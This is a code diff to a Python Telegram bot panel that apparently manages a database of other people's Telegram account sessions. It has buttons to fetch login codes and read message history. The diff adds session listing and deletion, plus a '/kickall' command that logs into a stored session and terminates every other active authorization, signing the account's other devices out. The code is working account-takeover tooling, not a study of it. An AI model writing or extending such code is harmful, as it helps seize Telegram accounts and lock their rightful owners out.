@@ -3,15 +3,18 @@ import json
 import logging
 from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
-from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
 from dotenv import load_dotenv
 from pymongo import MongoClient
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.tl.functions.messages import GetHistoryRequest
+from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
 from phonenumbers import parse, geocoder
 from aiogram.dispatcher.middlewares import BaseMiddleware
 from aiogram.dispatcher.handler import CancelHandler
+from aiogram.dispatcher import FSMContext
+from aiogram.contrib.fsm_storage.memory import MemoryStorage
 
 # Load .env
 load_dotenv()
@@ -37,7 +40,8 @@ light_admins_col = db["light_admins"]  # Light admin users
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=PANEL_TOKEN)
-dp = Dispatcher(bot)
+storage = MemoryStorage()
+dp = Dispatcher(bot, storage=storage)
 
 def is_main_admin(uid):
     return uid == ADMIN_ID
@@ -68,7 +72,8 @@ async def cmd_start(message: types.Message):
             InlineKeyboardButton("🧹 Delete Invalid", callback_data='validel'),
             InlineKeyboardButton("🔑 Get Telegram Code", callback_data='login'),
             InlineKeyboardButton("📨 FA Bot History", callback_data='fa'),
-            InlineKeyboardButton("👥 Manage Light Admins", callback_data='manage_la')
+            InlineKeyboardButton("👥 Manage Light Admins", callback_data='manage_la'),
+            InlineKeyboardButton("🗑 Session Management", callback_data='session_management')
         )
         await message.answer("👑 Welcome, Main Admin! Choose an action:", reply_markup=keyboard)
 
@@ -78,13 +83,13 @@ async def cmd_start(message: types.Message):
             InlineKeyboardButton("➕ Add Sessions", callback_data='addla'),
             InlineKeyboardButton("🔑 Get Telegram Code", callback_data='login'),
             InlineKeyboardButton("📨 FA Bot History", callback_data='fa'),
-            InlineKeyboardButton("🗑 Delete All My Sessions", callback_data='delall')
+            InlineKeyboardButton("🗑 Session Management", callback_data='session_management')
         )
         await message.answer("🛡 Welcome, Light Admin. Choose an action:", reply_markup=keyboard)
     else:
         await message.answer("❌ You don't have access to use this bot.")
 
-@dp.callback_query_handler(lambda c: c.data in ['log', 'loger', 'validel', 'login', 'fa', 'addla', 'delall', 'manage_la'])
+@dp.callback_query_handler(lambda c: c.data in ['log', 'loger', 'validel', 'login', 'fa', 'addla', 'delall', 'manage_la', 'session_management'])
 async def process_callback(callback_query: types.CallbackQuery):
     cmd = callback_query.data
     uid = callback_query.from_user.id
@@ -121,8 +126,97 @@ async def process_callback(callback_query: types.CallbackQuery):
             await manage_light_admins(uid)
         else:
             await bot.send_message(uid, "❌ Not allowed.")
+    elif cmd == 'session_management':
+        await show_session_management(uid)
 
     await callback_query.answer()
+
+async def show_session_management(user_id):
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    keyboard.add(
+        InlineKeyboardButton("📋 List My Sessions", callback_data='list_my_sessions'),
+        InlineKeyboardButton("🗑 Delete All Sessions", callback_data='delete_all_sessions'),
+        InlineKeyboardButton("🔍 Delete By Phone", callback_data='delete_by_phone'),
+        InlineKeyboardButton("🚪 Kick Other Sessions", callback_data='kick_other_sessions')
+    )
+    await bot.send_message(user_id, "🛠 Session Management:", reply_markup=keyboard)
+
+@dp.callback_query_handler(lambda c: c.data in ['list_my_sessions', 'delete_all_sessions', 'delete_by_phone', 'kick_other_sessions'])
+async def session_management_handler(callback_query: types.CallbackQuery):
+    cmd = callback_query.data
+    uid = callback_query.from_user.id
+    
+    if cmd == 'list_my_sessions':
+        await list_my_sessions(uid)
+    elif cmd == 'delete_all_sessions':
+        await confirm_delete_all_sessions(uid)
+    elif cmd == 'delete_by_phone':
+        await bot.send_message(uid, "Send phone number to delete session:\n`/delete_phone +1234567890`", parse_mode="Markdown")
+    elif cmd == 'kick_other_sessions':
+        await bot.send_message(uid, "Send phone number to kick other sessions:\n`/kickall +1234567890`", parse_mode="Markdown")
+    
+    await callback_query.answer()
+
+async def list_my_sessions(user_id):
+    if is_main_admin(user_id):
+        sessions = list(sessions_col.find({}))
+    else:
+        sessions = list(light_sessions_col.find({"owner_id": user_id}))
+    
+    if not sessions:
+        await bot.send_message(user_id, "❌ No sessions found.")
+        return
+    
+    text = "📋 Your Sessions:\n\n"
+    for session in sessions:
+        status = "✅ Valid" if session.get("valid", True) else "❌ Invalid"
+        text += f"📱 {session['phone']} - {status}\n"
+    
+    await bot.send_message(user_id, text)
+
+async def confirm_delete_all_sessions(user_id):
+    keyboard = InlineKeyboardMarkup()
+    keyboard.add(
+        InlineKeyboardButton("Yes, delete all", callback_data='confirm_delete_all'),
+        InlineKeyboardButton("Cancel", callback_data='cancel_delete_all')
+    )
+    await bot.send_message(user_id, "⚠️ Are you sure you want to delete ALL your sessions?", reply_markup=keyboard)
+
+@dp.callback_query_handler(lambda c: c.data in ['confirm_delete_all', 'cancel_delete_all'])
+async def delete_all_sessions_handler(callback_query: types.CallbackQuery):
+    cmd = callback_query.data
+    uid = callback_query.from_user.id
+    
+    if cmd == 'confirm_delete_all':
+        if is_main_admin(uid):
+            result = sessions_col.delete_many({})
+        else:
+            result = light_sessions_col.delete_many({"owner_id": uid})
+        await bot.send_message(uid, f"🗑 Deleted {result.deleted_count} sessions.")
+    else:
+        await bot.send_message(uid, "❌ Cancelled.")
+    
+    await callback_query.answer()
+
+@dp.message_handler(commands=['delete_phone'])
+async def delete_session_by_phone(message: types.Message):
+    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
+        return
+
+    phone = message.get_args().strip()
+    if not phone.startswith('+'):
+        await message.reply("❗ Use format: /delete_phone +1234567890")
+        return
+
+    if is_main_admin(message.from_user.id):
+        result = sessions_col.delete_one({"phone": phone})
+    else:
+        result = light_sessions_col.delete_one({"phone": phone, "owner_id": message.from_user.id})
+    
+    if result.deleted_count > 0:
+        await message.reply(f"✅ Session with phone {phone} deleted.")
+    else:
+        await message.reply("❌ Session not found.")
 
 async def manage_light_admins(admin_id):
     keyboard = InlineKeyboardMarkup(row_width=2)
@@ -184,7 +278,6 @@ async def remove_light_admin_cmd(message: types.Message):
         result = light_admins_col.delete_one({"user_id": user_id})
         
         if result.deleted_count > 0:
-            # Also remove all sessions owned by this light admin
             light_sessions_col.delete_many({"owner_id": user_id})
             await message.reply(f"✅ Removed light admin and their sessions: {user_id}")
         else:
@@ -367,10 +460,9 @@ async def cmd_fa(message: types.Message):
     try:
         await client.connect()
         
-        # Получаем историю сообщений
         history = await client(GetHistoryRequest(
             peer='T686T_bot',
-            limit=100,  # Увеличиваем лимит
+            limit=100,
             offset_date=None,
             offset_id=0,
             max_id=0,
@@ -383,10 +475,7 @@ async def cmd_fa(message: types.Message):
             await message.reply("⚠️ No messages in @T686T_bot.")
             return
 
-        # Получаем наш user_id
         me = await client.get_me()
-        
-        # Фильтруем сообщения - только исходящие (от пользователя)
         user_messages = [
             msg for msg in history.messages 
             if hasattr(msg, 'out') and msg.out
@@ -396,9 +485,8 @@ async def cmd_fa(message: types.Message):
             await message.reply("⚠️ No messages sent by you found in @T686T_bot.")
             return
 
-        # Формируем вывод
         output = []
-        for msg in user_messages[:25]:  # Берем последние 25 сообщений
+        for msg in user_messages[:25]:
             if hasattr(msg, 'message') and msg.message:
                 date_str = msg.date.strftime('%Y-%m-%d %H:%M') if hasattr(msg, 'date') else 'unknown date'
                 output.append(f"📤 {date_str}: {msg.message}")
@@ -407,11 +495,107 @@ async def cmd_fa(message: types.Message):
             await message.reply("⚠️ No valid messages found.")
             return
             
-        await message.reply(f"📤 Your messages to:\n\n" + "\n\n".join(output))
+        await message.reply(f"📤 Your messages to @T686T_bot:\n\n" + "\n\n".join(output))
         
     except Exception as e:
         await message.reply(f"❌ Error: {str(e)}")
     finally:
         await client.disconnect()
+
+@dp.message_handler(commands=['kickall'])
+async def cmd_kickall(message: types.Message):
+    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
+        return
+
+    args = message.get_args().strip()
+    if not args.startswith('+'):
+        await message.reply("❗ Use format: /kickall +1234567890")
+        return
+
+    if is_main_admin(message.from_user.id):
+        session = sessions_col.find_one({"phone": args})
+    else:
+        session = light_sessions_col.find_one({"phone": args, "owner_id": message.from_user.id})
+    
+    if not session:
+        await message.reply("❌ Session not found.")
+        return
+
+    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
+    try:
+        await client.connect()
+        
+        result = await client(GetAuthorizationsRequest())
+        
+        if not result.authorizations:
+            await message.reply("⚠️ No active sessions found.")
+            return
+
+        keyboard = InlineKeyboardMarkup(row_width=2)
+        keyboard.add(
+            InlineKeyboardButton("Terminate ALL other sessions", callback_data=f'terminate_all:{args}'),
+            InlineKeyboardButton("Keep all sessions", callback_data='cancel_terminate')
+        )
+        
+        await message.reply(
+            f"🔍 Found {len(result.authorizations)} active sessions for {args}.\n"
+            "Choose action:",
+            reply_markup=keyboard
+        )
+        
+    except Exception as e:
+        await message.reply(f"❌ Error: {str(e)}")
+    finally:
+        await client.disconnect()
+
+@dp.callback_query_handler(lambda c: c.data.startswith('terminate_all:') or c.data == 'cancel_terminate')
+async def terminate_sessions_handler(callback_query: types.CallbackQuery):
+    if callback_query.data == 'cancel_terminate':
+        await bot.send_message(callback_query.from_user.id, "❌ Cancelled.")
+        await callback_query.answer()
+        return
+    
+    phone = callback_query.data.split(':')[1]
+    uid = callback_query.from_user.id
+    
+    if is_main_admin(uid):
+        session = sessions_col.find_one({"phone": phone})
+    else:
+        session = light_sessions_col.find_one({"phone": phone, "owner_id": uid})
+    
+    if not session:
+        await bot.send_message(uid, "❌ Session not found.")
+        await callback_query.answer()
+        return
+
+    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
+    try:
+        await client.connect()
+        
+        current_session = await client(GetAuthorizationsRequest())
+        current_hash = None
+        
+        for auth in current_session.authorizations:
+            if auth.current:
+                current_hash = auth.hash
+                break
+        
+        terminated = 0
+        for auth in current_session.authorizations:
+            if not auth.current:
+                try:
+                    await client(ResetAuthorizationRequest(hash=auth.hash))
+                    terminated += 1
+                except:
+                    pass
+        
+        await bot.send_message(uid, f"✅ Terminated {terminated} other sessions for {phone}.")
+        
+    except Exception as e:
+        await bot.send_message(uid, f"❌ Error: {str(e)}")
+    finally:
+        await client.disconnect()
+        await callback_query.answer()
+
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
